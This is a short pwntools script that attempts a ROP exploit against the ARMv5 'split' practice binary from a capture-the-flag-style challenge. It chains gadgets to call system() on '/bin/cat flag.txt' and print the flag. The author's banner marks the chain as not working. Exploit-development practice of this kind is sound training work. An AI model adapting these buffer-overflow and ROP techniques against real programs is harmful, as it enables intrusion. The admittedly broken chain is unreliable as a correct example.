from pwn import *

########################################
#####         DOESN'T WORK         #####
########################################

BINARY = "./split_armv5"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

p = process(BINARY)

mov_r0_r3_pop_pop_pc = p32(0x10558) # mov r0, r3 ; pop {fp, pc}
pop_r3_pc           = p32(0x103a4) # pop {r3, pc}
cat_flag            = p32(0x2103C) # "/bin/cat flag.txt"
mov_r0_r7_blx_r3    = p32(0x10634) # mov r0, r7 ; blx r3
pop_r45678_sb_sl_pc = p32(0x10644) # pop {r4, r5, r6, r7, r8, sb, sl, pc}

rop = b"A" * 36
rop += p32(ELF.symbols["system"])
rop += pop_r45678_sb_sl_pc
rop += b"BBBB"
rop += b"CCCC"
rop += b"DDDD"
rop += cat_flag
rop += b"EEEE"
rop += b"FFFF"
rop += b"GGGG"
rop += mov_r0_r7_blx_r3

log.success(f"ROP chain : {rop}")
pause()
p.sendline(rop)
flag = p.recv().split(b'\n')
log.success(f"FLAG : {flag}")
